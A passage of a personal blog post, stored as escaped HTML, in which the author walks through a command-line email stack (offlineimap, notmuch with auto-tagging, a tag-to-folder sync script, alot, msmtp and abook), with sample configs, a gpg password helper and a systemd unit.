way across the structure (folder hierarchy for roundcube).&lt;/p&gt;
&lt;p&gt;I first came across &lt;a href="http://supmua.org/"&gt;sup&lt;/a&gt; which is a really nice mail user
agent. Sup didn't match my criteria for two reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;inability to synchronize tags on IMAP server (especially regarding folder
    structure).&lt;/li&gt;
&lt;li&gt;ruby (nothing against ruby but I'm more into Python)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then discovered &lt;a href="https://notmuchmail.org/"&gt;notmuch&lt;/a&gt; which is a rewrite of sup
with performance in mind. Notmuch is surrounded with very neat tools in the
UNIX-philosophy "&lt;em&gt;Do one thing and do it right&lt;/em&gt;". &lt;em&gt;notmuch&lt;/em&gt; is not as complete as
sup, it does not allow to read or write emails but only cares for indexing,
searching and tagging emails. The rest is done by other specific tools as
described below.&lt;/p&gt;
&lt;p&gt;Before I dig into the different blocks that are now building my email stack I
would like to mention that there are three ways (with pros and cons) to
synchronize your email's tags with a remote IMAP servers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;using X-Keywords&lt;/strong&gt;
    This method will add (or complete) the header's key named &lt;em&gt;X-Keywords&lt;/em&gt; with a
    list of tags (separated by a comma).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/gauteh/abunchoftags"&gt;abunchoftags&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://offlineimap.readthedocs.org/en/next/MANUAL.html?highlight=keywords#sync-from-gmail-to-a-local-maildir-with-labels"&gt;offlineimap with labels&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.offlineimap.org/doc/use_cases.html"&gt;offlineimap for gmail&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;using X-labels&lt;/strong&gt;
    As for previous solution, but by using the header's key named
    &lt;em&gt;X-labels&lt;/em&gt; with tags separated by a space.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;using folders&lt;/strong&gt;
    Tags are considered as virtual folders and thus translated into folders in
    &lt;a href="https://cr.yp.to/proto/maildir.html"&gt;maildir&lt;/a&gt; (filesystem) and on the remote
    mail server (IMAP server) and vice-versa.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I chose to use latest method for the following reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;immutability of email&lt;/strong&gt;: I didn't feel comfortable changing email's content&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;webmail (retro-)compatibility&lt;/strong&gt;: Roundcube is using folders to structure emails and
    has no understanding of &lt;em&gt;X-labels&lt;/em&gt; or &lt;em&gt;X-keywords&lt;/em&gt;. It thus would have been
    quite a mess when accessing my emails from a browser (flat structure, ...)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;sync only subset&lt;/strong&gt;: To quickly sync your emails, you might want to only synchronize a specific
    subset of them, for example &lt;em&gt;INBOX&lt;/em&gt;. If your emails are structured in folders
    on the remote IMAP server (maildir or similar), this is much easier to do&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let's get down to the email stack itself. It is made of multiple tools, each of
them doing a specific thing (and doing it right). It might seems a bit awkward
at first but once setup, it is a killing email setup !&lt;/p&gt;
&lt;p&gt;&lt;img alt="mailstack" src="https://deadc0de.re/images/mailstack.png"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;offlineimap&lt;/strong&gt;:
    sync emails with a remote IMAP server&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;notmuch&lt;/strong&gt;:
    index all emails and provide tagging and searching features&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;notmuch auto-tagging&lt;/strong&gt;:
    auto-tag new emails&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;maildir-notmuch-sync&lt;/strong&gt;:
    sync tags to folders and vice-versa&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;msmtp&lt;/strong&gt;:
    send emails&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;alot&lt;/strong&gt;:
    view, search and tag emails in a nice ncurses interface&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;abook&lt;/strong&gt;:
    store contacts and provide auto-completion when writing new emails&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let's view all these tools in details ...&lt;/p&gt;
&lt;h2&gt;offlineimap - the email fetcher&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.offlineimap.org/"&gt;offlineimap&lt;/a&gt; downloads emails from
an IMAP server and store them locally. It also sync your changes
back to the remote server.&lt;/p&gt;
&lt;p&gt;Here's my config file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# author: deadc0de&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;general&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;accounts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;
&lt;span class="n"&gt;pythonfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# path to below script&lt;/span&gt;
&lt;span class="n"&gt;fsync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;false&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Account&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;localrepository&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;
&lt;span class="n"&gt;remoterepository&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;remote&lt;/span&gt;

&lt;span class="n"&gt;presynchook&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;notmuch&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="n"&gt;pre&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# path to your maildir&lt;/span&gt;
&lt;span class="n"&gt;postsynchook&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;notmuch&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="n"&gt;post&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# path to your maildir&lt;/span&gt;

&lt;span class="c1"&gt;# use sqlite for quicker sync&lt;/span&gt;
&lt;span class="n"&gt;status_backend&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite&lt;/span&gt;
&lt;span class="c1"&gt;# number of concurrent connection to imap server&lt;/span&gt;
&lt;span class="n"&gt;maxconnections&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;

&lt;span class="c1"&gt;# auto-refresh every X minutes&lt;/span&gt;
&lt;span class="n"&gt;autorefresh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="c1"&gt;# quick refresh N times between the autorefresh&lt;/span&gt;
&lt;span class="c1"&gt;# won&amp;#39;t update the flags though&lt;/span&gt;
&lt;span class="n"&gt;quick&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Repository&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Maildir&lt;/span&gt;
&lt;span class="n"&gt;localfolders&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# maildir path&lt;/span&gt;
&lt;span class="n"&gt;nametrans&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;local_to_remote&lt;/span&gt; &lt;span class="c1"&gt;# ext call&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Repository&lt;/span&gt; &lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IMAP&lt;/span&gt;
&lt;span class="n"&gt;remotehost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# remote IMAP server&lt;/span&gt;
&lt;span class="n"&gt;remoteuser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# login username&lt;/span&gt;
&lt;span class="n"&gt;remotepasseval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mailpasswd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# ext call&lt;/span&gt;
&lt;span class="n"&gt;ssl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;yes&lt;/span&gt;
&lt;span class="n"&gt;realdelete&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt;
&lt;span class="n"&gt;remoteport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# remote port&lt;/span&gt;
&lt;span class="n"&gt;sslcacertfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ssl&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;certs&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ca&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;certificates&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crt&lt;/span&gt;
&lt;span class="n"&gt;nametrans&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;remote_to_local&lt;/span&gt; &lt;span class="c1"&gt;# ext call&lt;/span&gt;
&lt;span class="n"&gt;idlefolders&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;INBOX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The script &lt;code&gt;maildir-notmuch-sync&lt;/code&gt; used as a pre- and
post-hook is described in its own section below.&lt;/p&gt;
&lt;p&gt;And the python script providing the functions for translating folder's names
(&lt;code&gt;local_to_remote&lt;/code&gt; and &lt;code&gt;remote_to_local&lt;/code&gt;)
and retrieving the password using gpg2 (&lt;code&gt;mailpasswd&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# author: deadc0de&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;

&lt;span class="c1"&gt;# upload name translator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;local_to_remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;folder&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="c1"&gt;# TODO - do your translations with re here&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;folder&lt;/span&gt;

&lt;span class="c1"&gt;# download name translator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;remote_to_local&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;folder&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="c1"&gt;# TODO - do your translations with re here&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;folder&lt;/span&gt;

&lt;span class="c1"&gt;# password helper&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;mailpasswd&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TODO&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# gpg file path&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/gpg2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--batch&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For more information on how to configure/use offlineimap, see the
&lt;a href="http://www.offlineimap.org/documentation.html"&gt;official doc&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In order to avoid putting my password in clear text in the config, I used
gpg-agent to query the password from a gpg encrypted file created with&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# gpg key&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;YOURPASSWORD&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; gpg2 --encrypt --recipient &lt;span class="s2"&gt;&amp;quot;YOURNAME&amp;quot;&lt;/span&gt; -o &amp;lt;password-file&amp;gt;.gpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# symmetric&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;YOURPASSWORD&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; gpg2 -c &amp;gt; &amp;lt;password-file&amp;gt;.gpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Offlineimap can easily be used as a service to continuously refresh and sync
your emails with following systemd unit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Offlineimap daemon
&lt;span class="nv"&gt;Requires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;network-online.target
&lt;span class="nv"&gt;After&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;network.target

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;TODO
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/bin/offlineimap
&lt;span class="nv"&gt;KillSignal&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;SIGUSR2
&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;notmuch - the indexer&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://notmuchmail.org/"&gt;notmuch&lt;/a&gt; is a rewrite of &lt;em&gt;sup&lt;/em&gt; with performance in
mind. It allows to tag emails and search among them. It is very fast
and able to handle very large quantity of emails.&lt;/p&gt;
&lt;p&gt;Its configuration is very easy. You simply provide it with basic information on
your emails and specify the tags with which each new emails is to be tagged
with. This will be useful for &lt;code&gt;maildir-notmuch-sync&lt;/code&gt; used below as well as for
auto-tagging.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;notmuch&lt;/em&gt; is to be setup using &lt;code&gt;notmuch setup&lt;/code&gt;. Then each time you have
synchronized your emails (with &lt;em&gt;offlineimap&lt;/em&gt;), simply run &lt;code&gt;notmuch
new&lt;/code&gt; to index new mails.&lt;/p&gt;
&lt;h2&gt;notmuch auto-tagging script&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;notmuch&lt;/em&gt; itself can be used to auto-tag new emails. The easiest way
is to add a specific tag to new emails (&lt;em&gt;tofilter&lt;/em&gt; for example) and then
process all new emails right after calling &lt;code&gt;notmuch new&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First make sure you add a specific tag to new emails through
notmuch's config &lt;code&gt;tags=...&lt;/code&gt;. For the following example, the entry in notmuch
config would be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
&lt;span class="nv"&gt;tags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;new,tofilter
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This means that after running &lt;code&gt;notmuch new&lt;/code&gt;, any new email will be
automatically tagged with two tags: &lt;em&gt;new&lt;/em&gt; and &lt;em&gt;tofilter&lt;/em&gt;. &lt;em&gt;tofilter&lt;/em&gt; will be
used here to auto-tag emails while &lt;em&gt;new&lt;/em&gt; will be used by &lt;code&gt;maildir-notmuch-sync&lt;/code&gt;
described in following section.&lt;/p&gt;
&lt;p&gt;Now let's say you want all emails coming from
&lt;code&gt;debian-bugs-rc@lists.debian.org&lt;/code&gt; to be tagged with &lt;em&gt;debian&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;notmuch tag -tofilter +debian -- tag:tofilter and from:debian-bugs-rc@lists.debian.org
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This will remove the tag &lt;em&gt;tofilter&lt;/em&gt; and add the tag &lt;em&gt;debian&lt;/em&gt; to all emails which
are tagged &lt;em&gt;tofilter&lt;/em&gt; and are from the &lt;em&gt;debian bugs mailing list&lt;/em&gt;. For more information, see
the &lt;a href="https://notmuchmail.org/initial_tagging/"&gt;doc about initial tagging&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Since a new tag is added to all new emails (&lt;em&gt;tofilter&lt;/em&gt; in this example),
make sure you remove it from all emails that you don't process.
Otherwise you will have mails hanging around with the tag &lt;em&gt;tofilter&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;notmuch tag -tofilter -- tag:tofilter
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Theses steps can be put in a bash script and run from &lt;em&gt;maildir-notmuch-sync&lt;/em&gt; through
the &lt;em&gt;TAG_SCRIPT&lt;/em&gt; config.&lt;/p&gt;
&lt;h2&gt;maildir-notmuch-sync - the tags/folders sync script&lt;/h2&gt;
&lt;p&gt;This script was originally written by &lt;a href="http://ethanschoonover.com/"&gt;Ethan
Schoonover&lt;/a&gt;.
It is available on github under &lt;a href="https://github.com/mturquette/ghar-email/blob/master/.local/bin/maildir-notmuch-sync"&gt;this
link&lt;/a&gt;.
The original script's purpose is to synchronize notmuch tags with remote IMAP servers
and more specifically with gmail.&lt;/p&gt;
&lt;p&gt;I modified it to be able to translate notmuch's tags into a maildir folder and
thus get my emails structured on the IMAP server for access with webmail.
My modified version is available
&lt;a href="https://gitlab.com/deadc0de6/scripts/blob/master/maildir-notmuch-sync"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The modified version will create a new folder (locally in maildir and remotely
through offlineimap) when a new
tag is used for the first time. Also emails will be copied around depending on
their tags.&lt;/p&gt;
&lt;p&gt;Let's say for example that you tag a new email with two tags: &lt;em&gt;family&lt;/em&gt; and
&lt;em&gt;toremember&lt;/em&gt;. This script will copy the email to two different folders in the
maildir, the &lt;em&gt;family&lt;/em&gt; folder and the &lt;em&gt;toremember&lt;/em&gt; folder (and create them if
they don't exist).
When offlineimap will be run, those will be copied to the remote IMAP server to
their respective folders.&lt;/p&gt;
&lt;p&gt;It is very convenient but also has its drawbacks. A single email might
co-exist in several different folders on your maildir and on your IMAP
server.&lt;/p&gt;
&lt;h2&gt;alot - the MUA&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/pazz/alot"&gt;alot&lt;/a&gt; is the interface to your emails.
It is terminal based and fully compatible with notmuch.&lt;/p&gt;
&lt;p&gt;Its main features (to me at least):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;modular and implemented in Python&lt;/li&gt;
&lt;li&gt;based on ncurses (through the &lt;a href="http://urwid.org/"&gt;urwid toolkit&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;vim/pentadactyl keybindings (although fully customizable)&lt;/li&gt;
&lt;li&gt;slick and powerful interface (buffer-based, colors, ...)&lt;/li&gt;
&lt;li&gt;PGP/MIME support&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Some useful configs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sync INBOX folder and refresh when hitting comma&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shellescape&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;refocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;true&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;offlineimap -o -f INBOX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;inbox&lt;/span&gt; &lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;unread&lt;/span&gt; &lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;flagged&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;edit new email with vim&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;editor_cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;vim -c &amp;quot;set textwidth=72&amp;quot; -c &amp;quot;set wrap&amp;quot; -c &amp;quot;set spell&amp;quot; -c &amp;quot;set nocp&amp;quot;&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;use msmtp to send emails&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;accounts&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
      &lt;span class="n"&gt;realname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# your real name&lt;/span&gt;
      &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# your email address&lt;/span&gt;
      &lt;span class="n"&gt;sendmail_command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;msmtp&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;
      &lt;span class="n"&gt;sent_box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# the sent maildir folder&lt;/span&gt;
      &lt;span class="n"&gt;draft_box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c1"&gt;# the drafts maildir folder&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;use abook to search for contacts&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;accounts&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="p"&gt;[[[&lt;/span&gt;&lt;span class="n"&gt;abook&lt;/span&gt;&lt;span class="p"&gt;]]]&lt;/span&gt;
    &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;abook&lt;/span&gt;
    &lt;span class="n"&gt;abook_contacts_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TODO&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# path to abook file&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can find more themes (with screenshots)
&lt;a href="https://github.com/pazz/alot/tree/master/extra/themes"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://youtu.be/D0Yuc_25ySw"&gt;This (old) screencast&lt;/a&gt; shows the use of alot.
A good resource is the &lt;a href="https://alot.readthedocs.org/en/latest/installation.html"&gt;alot
documentation&lt;/a&gt; which
lists all needed configuration options.&lt;/p&gt;
&lt;h2&gt;msmtp - the email sender&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://msmtp.sourceforge.net/"&gt;msmtp&lt;/a&gt; is a SMTP client that allows to easily
transfer emails to an SMTP server.
It is easily integrated into &lt;em&gt;alot&lt;/em&gt; by providing an account in its config files
as mentioned &lt;a href="https://alot.readthedocs.org/en/latest/configuration/accounts.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://msmtp.sourceforge.net/doc/msmtp.html"&gt;Here&lt;/a&gt;'s the complete manual on
msmtp to help correctly configure msmtp.&lt;/p&gt;
&lt;p&gt;You can also use gpg2/gpg-agent to provide a password to msmtp without writing it in
clear text in the config file.&lt;/p&gt;
